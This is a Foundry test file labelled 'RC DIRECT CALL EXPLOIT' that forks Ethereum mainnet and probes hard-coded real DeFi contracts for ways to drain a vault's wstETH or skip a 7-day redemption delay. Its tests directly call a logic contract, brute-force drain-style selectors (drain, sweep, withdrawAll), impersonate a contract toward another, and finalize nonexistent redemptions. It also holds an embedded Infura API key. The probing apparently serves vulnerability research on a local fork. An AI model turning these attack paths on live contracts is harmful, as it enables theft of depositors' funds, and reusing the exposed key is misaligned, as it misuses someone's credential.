// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

/**
 * RC DIRECT CALL EXPLOIT
 *
 * DISCOVERY: RC has UNLIMITED wstETH allowance from VAULT!
 *
 * Normal flow: R0 delegatecalls RC -> RC reads R0 storage -> 7-day delay enforced
 *
 * HYPOTHESIS: If we call RC directly, it reads its OWN storage!
 * - RC's storage slot 4 might have different delay value
 * - RC's storage might have different redemption mappings
 * - This could bypass the delay!
 */
contract RCDirectCallExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_RCStorageVsR0Storage() public {
        console.log("=== RC STORAGE vs R0 STORAGE ===\n");

        // Compare critical storage slots
        console.log("Slot 4 (delay config):");
        bytes32 r0Slot4 = vm.load(R0, bytes32(uint256(4)));
        bytes32 rcSlot4 = vm.load(RC, bytes32(uint256(4)));
        console.log("R0:");
        console.logBytes32(r0Slot4);
        console.log("RC:");
        console.logBytes32(rcSlot4);

        uint256 r0Delay = (uint256(r0Slot4) >> 96) & type(uint32).max;
        uint256 rcDelay = (uint256(rcSlot4) >> 96) & type(uint32).max;
        console.log("\nR0 delay:", r0Delay / 86400, "days");
        console.log("RC delay:", rcDelay / 86400, "days");

        if (rcDelay == 0 || rcDelay < r0Delay) {
            console.log("\n*** RC HAS SHORTER/ZERO DELAY! ***");
        }

        // Check slot 0 (owner/timelock)
        console.log("\nSlot 0 (owner):");
        bytes32 r0Slot0 = vm.load(R0, bytes32(uint256(0)));
        bytes32 rcSlot0 = vm.load(RC, bytes32(uint256(0)));
        console.log("R0:", address(uint160(uint256(r0Slot0))));
        console.log("RC:", address(uint160(uint256(rcSlot0))));

        // Check slot 1 (asset)
        console.log("\nSlot 1 (asset):");
        bytes32 r0Slot1 = vm.load(R0, bytes32(uint256(1)));
        bytes32 rcSlot1 = vm.load(RC, bytes32(uint256(1)));
        console.log("R0:", address(uint160(uint256(r0Slot1))));
        console.log("RC:", address(uint160(uint256(rcSlot1))));

        // Check slot 2 (tAsset)
        console.log("\nSlot 2 (tAsset):");
        bytes32 r0Slot2 = vm.load(R0, bytes32(uint256(2)));
        bytes32 rcSlot2 = vm.load(RC, bytes32(uint256(2)));
        console.log("R0:", address(uint160(uint256(r0Slot2))));
        console.log("RC:", address(uint160(uint256(rcSlot2))));

        // Check slot 3 (vault)
        console.log("\nSlot 3 (vault):");
        bytes32 r0Slot3 = vm.load(R0, bytes32(uint256(3)));
        bytes32 rcSlot3 = vm.load(RC, bytes32(uint256(3)));
        console.log("R0:", address(uint160(uint256(r0Slot3))));
        console.log("RC:", address(uint160(uint256(rcSlot3))));
    }

    function test_DirectCallRCRedeem() public {
        console.log("=== DIRECT CALL RC.redeem() ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        console.log("Calling RC.redeem(1000e18) directly...");
        (bool s1, bytes memory d1) = RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Success:", s1);
        if (!s1 && d1.length > 4) {
            console.log("Revert reason:");
            console.logBytes(d1);
        }

        // Check if redemption was created in RC's storage (not R0's)
        (bool s2, bytes memory d2) = RC.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s2 && d2.length > 0) {
            console.log("Redemption count in RC:", abi.decode(d2, (uint256)));
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DirectCallRCFinalize() public {
        console.log("=== DIRECT CALL RC.finalizeRedeem() ===\n");

        // First create a redemption in RC's storage
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Try to redeem directly to RC
        RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try immediate finalize
        console.log("Trying immediate finalize on RC...");
        (bool s1,) = RC.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize success:", s1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_RCFallbackExploit() public {
        console.log("=== RC FALLBACK EXPLOIT ===\n");

        // RC is a logic contract that expects delegatecall
        // What happens if we call it directly with unknown selectors?

        vm.startPrank(attacker);

        // Try various selectors that might exist
        bytes4[] memory sigs = new bytes4[](20);
        sigs[0] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[1] = bytes4(keccak256("withdraw(uint256)"));
        sigs[2] = bytes4(keccak256("withdrawAll()"));
        sigs[3] = bytes4(keccak256("drain(address)"));
        sigs[4] = bytes4(keccak256("sweep(address)"));
        sigs[5] = bytes4(keccak256("rescue(address)"));
        sigs[6] = bytes4(keccak256("execute(address,bytes)"));
        sigs[7] = bytes4(keccak256("call(address,bytes)"));
        sigs[8] = bytes4(keccak256("processRedeem(address,uint256)"));
        sigs[9] = bytes4(keccak256("completeRedeem(address,uint256)"));
        sigs[10] = bytes4(keccak256("redeemFor(address,uint96)"));
        sigs[11] = bytes4(keccak256("finalizeRedeemFor(address,uint256)"));
        sigs[12] = bytes4(keccak256("claim(address)"));
        sigs[13] = bytes4(keccak256("claimAll()"));
        sigs[14] = bytes4(keccak256("exit()"));
        sigs[15] = bytes4(keccak256("emergencyExit()"));
        sigs[16] = bytes4(keccak256("transferToken(address,address,uint256)"));
        sigs[17] = bytes4(keccak256("sendAsset(address,uint256)"));
        sigs[18] = bytes4(keccak256("pullFunds(uint256)"));
        sigs[19] = bytes4(keccak256("pushFunds(address,uint256)"));

        console.log("Testing selectors on RC...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = RC.call(abi.encodeWithSelector(sigs[i], attacker, 1000e18));
            if (s) {
                console.log("Selector succeeded:", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ExploitRCAllowance() public {
        console.log("=== EXPLOIT RC's VAULT ALLOWANCE ===\n");

        uint256 allowance = IERC20(wstETH).allowance(VAULT, RC);
        console.log("RC's allowance from VAULT:", allowance > 1e70 ? "UNLIMITED" : "LIMITED");

        // RC can call wstETH.transferFrom(VAULT, ..., ...)
        // If RC has any function that does this without proper auth...

        // Analyze RC's functions
        bytes memory rcCode = RC.code;
        console.log("RC code size:", rcCode.length);

        // Look for transferFrom pattern in bytecode
        // transferFrom selector: 0x23b872dd
        bytes4 transferFromSig = bytes4(keccak256("transferFrom(address,address,uint256)"));
        console.log("transferFrom selector:");
        console.logBytes4(transferFromSig);

        // Search for this selector in RC's code
        bool found = false;
        for (uint i = 0; i < rcCode.length - 4; i++) {
            if (rcCode[i] == 0x23 && rcCode[i+1] == 0xb8 && rcCode[i+2] == 0x72 && rcCode[i+3] == 0xdd) {
                console.log("transferFrom at offset:", i);
                found = true;
            }
        }

        if (found) {
            console.log("\n*** RC USES transferFrom - POTENTIAL ATTACK VECTOR ***");
        }
    }

    function test_RCStorageManipulation() public {
        console.log("=== RC STORAGE MANIPULATION ===\n");

        // What if we can write to RC's storage directly?
        // Then when R0 delegatecalls RC, the code reads from R0's storage
        // But if we can somehow confuse the storage context...

        // Check RC's EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);

        bytes32 rcImpl = vm.load(RC, implSlot);
        bytes32 rcAdmin = vm.load(RC, adminSlot);

        console.log("RC EIP-1967 implementation:");
        console.logBytes32(rcImpl);
        console.log("RC EIP-1967 admin:");
        console.logBytes32(rcAdmin);

        // Is RC itself a proxy?
        if (uint256(rcImpl) != 0) {
            console.log("\n*** RC IS A PROXY! ***");
            console.log("Implementation:", address(uint160(uint256(rcImpl))));
        }
    }

    function test_SpoofMsgSender() public {
        console.log("=== SPOOF MSG.SENDER IN DELEGATECALL ===\n");

        // When R0 delegatecalls RC:
        // - msg.sender is preserved (the original caller)
        // - storage is R0's storage

        // But what if RC internally does another call/delegatecall?
        // The msg.sender to that call would be R0!

        // RC slot 5 = IAU address
        bytes32 rcSlot5 = vm.load(RC, bytes32(uint256(5)));
        address iau = address(uint160(uint256(rcSlot5)));
        console.log("RC slot 5 (IAU?):", iau);

        // What if IAU has functions that accept calls from RC?
        if (iau != address(0) && iau.code.length > 0) {
            console.log("IAU has code!");

            // Try to call IAU pretending to be RC
            vm.startPrank(RC);
            (bool s1,) = iau.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
            console.log("IAU.withdraw from RC:", s1);
            vm.stopPrank();
        }
    }

    function test_CreateMaliciousRedemption() public {
        console.log("=== CREATE MALICIOUS REDEMPTION ===\n");

        // The redemption struct has: amount, timestamp
        // What if we can create a redemption with timestamp in the past?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Check the redemption request
        (bool s1, bytes memory d1) = R0.staticcall(
            abi.encodeWithSignature("getRedeemRequest(address,uint256)", attacker, 0)
        );

        if (s1 && d1.length > 0) {
            (uint256 amount, uint256 timestamp) = abi.decode(d1, (uint256, uint256));
            console.log("Redemption amount:", amount / 1e18);
            console.log("Redemption timestamp:", timestamp);
            console.log("Current time:", block.timestamp);
            console.log("Time until finalize:", (timestamp + 7 days - block.timestamp) / 3600, "hours");
        }

        vm.stopPrank();
    }

    function test_RedeemWithZeroTimestamp() public {
        console.log("=== REDEEM WITH ZERO TIMESTAMP ===\n");

        // Check if timestamp=0 has special meaning
        // Maybe it's treated as "immediately finalizable"?

        // First check how the delay check works
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 delay = (uint256(slot4) >> 96) & type(uint32).max;
        console.log("Delay value:", delay);

        // The check is: block.timestamp >= request.timestamp + delay
        // If request.timestamp = 0: block.timestamp >= 0 + 604800 = 604800
        // Current timestamp is much larger than 604800, so this should pass!

        console.log("Current timestamp:", block.timestamp);
        console.log("Required for timestamp=0:", delay);

        if (block.timestamp >= delay) {
            console.log("\n*** IF TIMESTAMP=0, CONDITION PASSES! ***");
        }

        // But wait - we can't set timestamp=0 during redeem
        // The contract sets: timestamp = block.timestamp

        // Unless... there's an uninitialized redemption slot?
    }

    function test_UninitializedRedemption() public {
        console.log("=== UNINITIALIZED REDEMPTION ===\n");

        // What if we try to finalize an index that was never created?
        // The storage would be 0s (amount=0, timestamp=0)
        // If timestamp=0 and delay check passes...

        vm.startPrank(attacker);

        // Don't create any redemption, just try to finalize index 0
        console.log("Trying to finalize non-existent redemption index 0...");
        (bool s1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize success:", s1);

        // Try large index
        console.log("Trying to finalize index 999999...");
        (bool s2,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 999999));
        console.log("Finalize success:", s2);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ArrayLengthUnderflow() public {
        console.log("=== ARRAY LENGTH UNDERFLOW ===\n");

        // What if we can underflow the redemption array length?
        // Then we might be able to access storage slots we shouldn't

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create one redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(100e18)));

        // Check length
        (bool s1, bytes memory d1) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        uint256 lengthAfterRedeem = abi.decode(d1, (uint256));
        console.log("Length after redeem:", lengthAfterRedeem);

        // Wait and finalize
        vm.warp(block.timestamp + 7 days + 1);
        R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

        // Check length again - does it decrease?
        (bool s2, bytes memory d2) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        uint256 lengthAfterFinalize = abi.decode(d2, (uint256));
        console.log("Length after finalize:", lengthAfterFinalize);

        // Cancel should also affect length
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(100e18)));
        R0.call(abi.encodeWithSignature("cancelRedeem(uint256)", 1));

        (bool s3, bytes memory d3) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        uint256 lengthAfterCancel = abi.decode(d3, (uint256));
        console.log("Length after cancel:", lengthAfterCancel);

        vm.stopPrank();
    }
}
